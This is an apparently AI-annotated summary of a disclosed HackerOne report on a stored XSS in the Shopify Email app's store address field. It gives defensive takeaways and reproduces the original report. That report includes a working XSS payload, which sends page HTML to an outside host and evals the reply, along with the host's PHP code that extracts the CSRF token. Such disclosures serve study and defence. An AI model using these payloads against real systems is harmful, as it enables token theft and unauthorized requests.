# XSS within Shopify Email App - Admin

## Metadata
- **Source:** HackerOne
- **Report:** 869831 | https://hackerone.com/reports/869831
- **Submitted:** 2020-05-10
- **Reporter:** imgnotfound
- **Program:** Shopify
- **Bounty:** Not specified in report
- **Severity:** High
- **Vuln:** Cross-Site Scripting (XSS), Stored XSS, Input Validation Bypass, Character Limit Bypass
- **CVEs:** None
- **Category:** web-api

## Summary
The Shopify Email Application contains a stored XSS vulnerability in the store address settings, specifically in the 'Apartment, suite, etc.' field. An admin user can inject malicious HTML/JavaScript that executes when the Shopify Email template is rendered, bypassing the 255-character limit. This allows attackers to steal CSRF tokens and make unauthorized requests to the email app API.

## Attack scenario
1. Attacker with admin Settings access navigates to Settings > General > Store address section
2. Attacker injects malicious HTML payload into the 'Apartment, suite, etc. (optional)' field, bypassing the 255-character limit restriction
3. Attacker installs or uses the Shopify Email App and selects a template that displays the address field
4. When the email template is rendered, the injected JavaScript executes in the admin context
5. The malicious script extracts the CSRF token from the page and exfiltrates it to attacker-controlled server (fbs.ninja)
6. Attacker uses the stolen CSRF token to make authenticated requests to the email.shopifyapps.com/graphql endpoint

## Root cause
Insufficient input validation and output encoding on the store address fields. The application trusts and renders user-supplied input without proper sanitization, and the client-side character limit (255 chars) provides no server-side protection against complex payloads.

## Attacker mindset
An insider threat or compromised admin account could exploit this to extract sensitive tokens and compromise email functionality. The attacker demonstrates sophistication by using timeouts and postMessage to bypass potential security controls, then exfiltrates data cross-domain.

## Defensive takeaways
- Implement server-side input validation and character limits, not just client-side restrictions
- Sanitize and properly encode all user inputs before rendering in templates (use context-aware escaping)
- Apply Content Security Policy (CSP) headers to restrict inline script execution and control resource loading
- Validate and sanitize HTML in address fields - reject or escape HTML special characters
- Implement CSRF protection that doesn't rely solely on tokens in the DOM
- Use HTML templating libraries with auto-escaping enabled
- Audit all user-controllable fields that appear in email templates for XSS vectors
- Implement rate limiting on API endpoints to detect token exfiltration attempts

## Variant hunting
Check other optional address fields (city, postal code, country) for similar XSS vulnerabilities
Test store name, domain, and business information fields in settings
Audit other Shopify apps that display user-supplied store configuration data
Review email template customization features for similar injection points
Test webhook payload handling and email preview functionality for XSS
Check if SVG or other polyglot file formats can bypass HTML filters in address fields

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1566 - Phishing (if used to deliver malware via emails)
- T1598 - Phishing for Information (CSRF token exfiltration)
- T1539 - Steal Web Session Cookie
- T1557 - Man-in-the-Middle (potential CSRF token interception)

## Notes
This report demonstrates privilege escalation risk - a user with limited Settings-only access can compromise the Email app. The attacker's code complexity suggests intentional evasion of character limits and security controls. The use of postMessage indicates awareness of cross-origin restrictions. The vulnerability requires admin/settings access, limiting scope but increasing impact if an account is compromised. The report lacks confirmation of actual bounty amount and final resolution status.

## Full report
<details><summary>Expand</summary>

The Shopify Email Application is vulnerable to XSS

A user with only **Settings** https://hackerone.myshopify.com/admin/settings/general access can inject html within the **Apartment, suite, etc. (optional)** of the **Store address** section that will then be displayed in the Shopify Email Template edition

## Steps to reproduce
1. Open **Settings** page
1. Insert malicious HTML within the **Apartment, suite, etc. (optional)** field. Please note that the inserted code is a bit too complex for nothing but was just trying out if it was possible to "bypass" the 255 characters limit , which is possible. (Code snippet can be found below).
██████
3. Install Shopify Email App
4. Select a template that displays **Apartment, suite, etc. (optional)** field
{F822194}


## Javascript code used
```
<img src="a:" onerror="var t=setTimeout;t(function(){var b=function(d){var x=new XMLHttpRequest;t(function(){eval(x.responseText)},2000);x.open('POST','https://fbs.ninja');x.send(d)};window.parent.postMessage(b(document.head.innerHTML),'*');},2000)"/>
```

## PHP code of https://fbs.ninja used in the XMLHttpRequest
```
<?
header("Access-Control-Allow-Origin: *");

$html = file_get_contents('php://input');

$doc = DOMDocument::loadHTML($html);
$xpath = new DOMXPath($doc);
$query = "//meta[@name='csrf-token']";
$entries = $xpath->query($query);

$csrf = "";
foreach ($entries as $entry) {
	$csrf = $entry->getAttribute('content');
	break;
}

$request = "alert('CSRF Token: " . $csrf . "');";

echo $request;

?>

## Impact

An attacker could at least trigger requests to the https://email.shopifyapps.com/graphql endpoint.

</details>

---
*Analysed by Claude on 2026-05-24*
